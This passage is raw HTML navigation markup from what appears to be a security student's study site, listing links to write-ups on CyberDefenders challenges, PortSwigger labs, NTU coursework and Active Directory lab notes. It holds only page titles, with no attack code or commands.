data-nav-id=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/hunter---medium/cyberdefender---hunter-part-3/index.html>CyberDefender - Hunter (Part 3)</a></li><li data-nav-id=/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/index.html><a class=padding href=/security/practice/cyberdefender/threat-intel/cyberdefender---intel101/index.html>CyberDefender - Intel101</a></li><li data-nav-id=/security/practice/cyberdefender/cyberdefender---krakenkeylogger/index.html><a class=padding href=/security/practice/cyberdefender/cyberdefender---krakenkeylogger/index.html>CyberDefender - KrakenKeylogger</a></li><li data-nav-id=/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/index.html><a class=padding href=/security/practice/cyberdefender/threat-intel/cyberdefender---lespion/index.html>CyberDefender - L'espion</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---pos/index.html>CyberDefender - MrRobot - POS</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/mrrobot---medium/cyberdefender---mrrobot---target-2/index.html>CyberDefender - MrRobot - Target 2</a></li><li data-nav-id=/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/index.html><a class=padding href=/security/practice/cyberdefender/network-forensic/cyberdefender---poisonedcredentials/index.html>CyberDefender - PoisonedCredentials</a></li><li data-nav-id=/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/index.html><a class=padding href=/security/practice/cyberdefender/network-forensic/cyberdefender---psexec-hunt/index.html>CyberDefender - PsExec Hunt</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---redline/index.html>CyberDefender - RedLine</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/cyberdefender---spotlight/index.html>CyberDefender - Spotlight</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-1/index.html>CyberDefender - Szechuan Sauce (Part 1)</a></li><li data-nav-id=/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/index.html><a class=padding href=/security/practice/cyberdefender/endpoint-forensic/szechuan-sauce---medium/cyberdefender---szechuan-sauce-part-2/index.html>CyberDefender - Szechuan Sauce (Part 2)</a></li><li data-nav-id=/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/index.html><a class=padding href=/security/practice/cyberdefender/network-forensic/cyberdefender---tomcat-takeover/index.html>CyberDefender - Tomcat Takeover</a></li><li data-nav-id=/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/index.html><a class=padding href=/security/practice/cyberdefender/network-forensic/cyberdefender---webstrike/index.html>CyberDefender - WebStrike</a></li><li data-nav-id=/security/competition/deadface-ctf-2023/index.html><a class=padding href=/security/competition/deadface-ctf-2023/index.html>DEADFACE CTF 2023</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/deserialization/deserialization---apprentice/index.html>Deserialization - APPRENTICE</a></li><li data-nav-id=/security/competition/eof-ais3-final/index.html><a class=padding href=/security/competition/eof-ais3-final/index.html>EOF AIS3 Final</a></li><li data-nav-id=/security/practice/hackthebox/hackthebox/index.html><a class=padding href=/security/practice/hackthebox/hackthebox/index.html>HackTheBox</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/deserialization/lab_-arbitrary-object-injection-in-php/index.html>Lab: Arbitrary object injection in PHP</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction/index.html>Lab: Blind XXE with out-of-band interaction</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/blind-xxe/lab_-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities/index.html>Lab: Blind XXE with out-of-band interaction via XML parameter entities</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-is-not-tied-to-user-session/index.html>Lab: CSRF where token is not tied to user session</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/csrf/not-complete/lab_-csrf-where-token-is-tied-to-non-session-cookie/index.html>Lab: CSRF where token is tied to non-session cookie</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-request-method/index.html>Lab: CSRF where token validation depends on request method</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/csrf/%E9%87%9D%E5%B0%8Dcsrf-token%E8%88%87%E5%90%8C%E6%BA%90%E6%94%BF%E7%AD%96%E7%9A%84%E7%B9%9E%E9%81%8E%E6%89%8B%E6%AE%B5/lab_-csrf-where-token-validation-depends-on-token-being-present/index.html>Lab: CSRF where token validation depends on token being present</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xss/lab_-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element/index.html>Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xinclude-to-retrieve-files/index.html>Lab: Exploiting `XInclude` to retrieve files</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd/index.html>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/external-malicious-server/lab_-exploiting-blind-xxe-to-retrieve-data-via-error-messages/index.html>Lab: Exploiting blind XXE to retrieve data via error messages</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/deserialization/lab_-exploiting-java-deserialization-with-apache-commons/index.html>Lab: Exploiting Java deserialization with Apache Commons</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xxe/lab_-exploiting-xxe-via-image-file-upload/index.html>Lab: Exploiting XXE via image file upload</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/deserialization/lab_-modifying-serialized-data-types/index.html>Lab: Modifying serialized data types</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/index.html>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/index.html>Lab: SQL injection attack, listing the database contents on Oracle</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/index.html>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/index.html>Lab: SQL injection attack, querying the database type and version on Oracle</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/index.html>Lab: SQL injection UNION attack, determining the number of columns returned by the query</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/index.html>Lab: SQL injection UNION attack, finding a column containing text</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/index.html>Lab: SQL injection UNION attack, retrieving data from other tables</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/index.html>Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/index.html>Lab: Stored DOM XSS</a></li><li data-nav-id=/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html><a class=padding href=/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/index.html>Lab: Using application functionality to exploit insecure deserialization</a></li><li data-nav-id=/security/course/ntu-ml/machine-learning-hand-write-homework--answer/index.html><a class=padding href=/security/course/ntu-ml/machine-learning-hand-write-homework--answer/index.html>Machine Learning Hand-write Homework & Answer</a></li><li data-nav-id=/security/practice/nisra/web/nisra---different-places/index.html><a class=padding href=/security/practice/nisra/web/nisra---different-places/index.html>NISRA - different places</a></li><li data-nav-id=/security/practice/nisra/misc/nisra---hidden_/index.html><a class=padding href=/security/practice/nisra/misc/nisra---hidden_/index.html>NISRA - Hidden?</a></li><li data-nav-id=/security/practice/nisra/web/nisra---md5_1/index.html><a class=padding href=/security/practice/nisra/web/nisra---md5_1/index.html>NISRA - MD5_1</a></li><li data-nav-id=/security/practice/nisra/web/nisra---md5_2/index.html><a class=padding href=/security/practice/nisra/web/nisra---md5_2/index.html>NISRA - MD5_2</a></li><li data-nav-id=/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/index.html><a class=padding href=/security/practice/nisra/misc/nisra-2023-enlightened---jack%E7%9A%84flag/index.html>NISRA 2023 Enlightened - Jackçš„flag</a></li><li data-nav-id=/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/index.html><a class=padding href=/security/practice/nisra/misc/nisra-2023-enlightened---magic-function/index.html>NISRA 2023 Enlightened - Magic Function</a></li><li data-nav-id=/security/practice/nisra/misc/nisra-2023-enlightened---pixel/index.html><a class=padding href=/security/practice/nisra/misc/nisra-2023-enlightened---pixel/index.html>NISRA 2023 Enlightened - Pixel</a></li><li data-nav-id=/security/course/ntu-cns/ntu-cns-final-project-proposal/index.html><a class=padding href=/security/course/ntu-cns/ntu-cns-final-project-proposal/index.html>NTU CNS Final Project Proposal</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2019-spring/index.html>NTU Compiler Technology Previous Exam 2019 Spring</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-previous-exam-2020-spring/index.html>NTU Compiler Technology Previous Exam 2020 Spring</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-project-1/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-project-1/index.html>NTU Compiler Technology Project 1</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-project-2/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-project-2/index.html>NTU Compiler Technology Project 2</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-project-3/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-project-3/index.html>NTU Compiler Technology Project 3</a></li><li data-nav-id=/security/course/ntu-ct/ntu-compiler-technology-project-4/index.html><a class=padding href=/security/course/ntu-ct/ntu-compiler-technology-project-4/index.html>NTU Compiler Technology Project 4</a></li><li data-nav-id=/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/index.html><a class=padding href=/security/course/ntu-cs/crypto/ntu-cs-2023-hw1-write-up/index.html>NTU CS 2023 HW1 Write Up</a></li><li data-nav-id=/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html><a class=padding href=/security/course/ntu-cs/reverse/ntu-cs-2023-hw2-write-up/index.html>NTU CS 2023 HW2 Write Up</a></li><li class=active data-nav-id=/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html><a class=padding href=/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html>NTU CS 2023 HW3 Write Up</a></li><li data-nav-id=/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html><a class=padding href=/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/index.html>NTU CS 2023 HW4 Write Up</a></li><li data-nav-id=/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/index.html><a class=padding href=/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/index.html>NTU CS HW0 Write Up</a></li><li data-nav-id=/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/index.html><a class=padding href=/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/index.html>NTU Machine Learning Final Project Proposal Notes</a></li><li data-nav-id=/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/index.html><a class=padding href=/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/index.html>NTU Machine Learning Final Project Proposal Notes</a></li><li data-nav-id=/security/course/ntu-ml/ntu-machine-learning-homework-1/index.html><a class=padding href=/security/course/ntu-ml/ntu-machine-learning-homework-1/index.html>NTU Machine Learning Homework 1</a></li><li data-nav-id=/security/course/ntu-ml/ntu-machine-learning-homework-2/index.html><a class=padding href=/security/course/ntu-ml/ntu-machine-learning-homework-2/index.html>NTU Machine Learning Homework 2</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-final-project-notes/index.html>NTU Malware Reverse Final Project Notes</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-hw-1-write-up/index.html>NTU Malware Reverse HW 1 write up</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-hw-2-write-up/index.html>NTU Malware Reverse HW 2 write up</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-hw-3-write-up/index.html>NTU Malware Reverse HW 3 write up</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-lab-1-write-up/index.html>NTU Malware Reverse Lab 1 write up</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-lab-2-write-up/index.html>NTU Malware Reverse Lab 2 write up</a></li><li data-nav-id=/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/index.html><a class=padding href=/security/course/ntu-mr/ntu-malware-reverse-lab-3-write-up/index.html>NTU Malware Reverse Lab 3 write up</a></li><li data-nav-id=/security/course/ntu-os/ntu-operating-system-project-1/index.html><a class=padding href=/security/course/ntu-os/ntu-operating-system-project-1/index.html>NTU Operating System Project 1</a></li><li data-nav-id=/security/course/ntu-os/ntu-operating-system-project-2/index.html><a class=padding href=/security/course/ntu-os/ntu-operating-system-project-2/index.html>NTU Operating System Project 2</a></li><li data-nav-id=/security/course/ntu-os/ntu-operating-system-project-3/index.html><a class=padding href=/security/course/ntu-os/ntu-operating-system-project-3/index.html>NTU Operating System Project 3</a></li><li data-nav-id=/security/course/ntu-os/ntu-operating-system-review-notes/index.html><a class=padding href=/security/course/ntu-os/ntu-operating-system-review-notes/index.html>NTU Operating System Review Notes</a></li><li data-nav-id=/security/course/ntu-st/ntu-software-testing-notes-1/index.html><a class=padding href=/security/course/ntu-st/ntu-software-testing-notes-1/index.html>NTU Software Testing Notes</a></li><li data-nav-id=/security/course/ntu-st/ntu-software-testing-notes/index.html><a class=padding href=/security/course/ntu-st/ntu-software-testing-notes/index.html>NTU Software Testing Notes</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html>NTUSTISC - AD Note - Lab(AS-REP Roasting)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html>NTUSTISC - AD Note - Lab(Brute Force SAM)</a></li><li data-nav-id=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html><a class=padding href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html>NTUSTISC - AD Note - Lab(Hijack Token)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html>NTUSTISC - AD Note - Lab(Leak Password)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html>NTUSTISC - AD Note - Lab(Password Spraying)</a></li><li data-nav-id=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html><a class=padding href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html>NTUSTISC - AD Note - Lab(SMBé ç«¯è®€å¯«)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/index.html>NTUSTISC - AD Note - Lab(åµæ¸¬LSASS)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/index.html>NTUSTISC - AD Note - Lab(åµæ¸¬å¯†ç¢¼æ®ç‘)</a></li><li data-nav-id=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html><a class=padding href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/index.html>NTUSTISC - AD Note - Lab(åµæ¸¬ææ¬Š)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/index.html>NTUSTISC - AD Note - Lab(åµæ¸¬æŸ¥è©¢çš„æ“ä½œ)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x18%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95%E5%BE%97%E5%88%B0lsass.dmp/index.html>NTUSTISC - AD Note - Lab(å…¶ä»–æ–¹æ³•å¾—åˆ°lsass.dmp)</a></li><li data-nav-id=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html><a class=padding href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/index.html>NTUSTISC - AD Note - Lab(åˆ©ç”¨å¼±é»)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/index.html>NTUSTISC - AD Note - Lab(æŸ¥è©¢æœ¬åœ°ä½¿ç”¨è€…)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/index.html>NTUSTISC - AD Note - Lab(æŸ¥è©¢ç¶²åŸŸç¾¤çµ„)</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html><a class=padding href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/index.html>NTUSTISC - AD Note - Lab(ç„¡æ³•Rebootçš„æ™‚ç›œå–Passwd)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/index.html>NTUSTISC - AD Note - Lab(ç’°å¢ƒèª¿æŸ¥BloodHound)</a></li><li data-nav-id=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html><a class=padding href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/index.html>NTUSTISC - AD Note - Lab(ç•¶å‰ç¶²åŸŸæ§åˆ¶ç«™(DC))</a></li><li data-nav-id=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/index.html><a class=padding 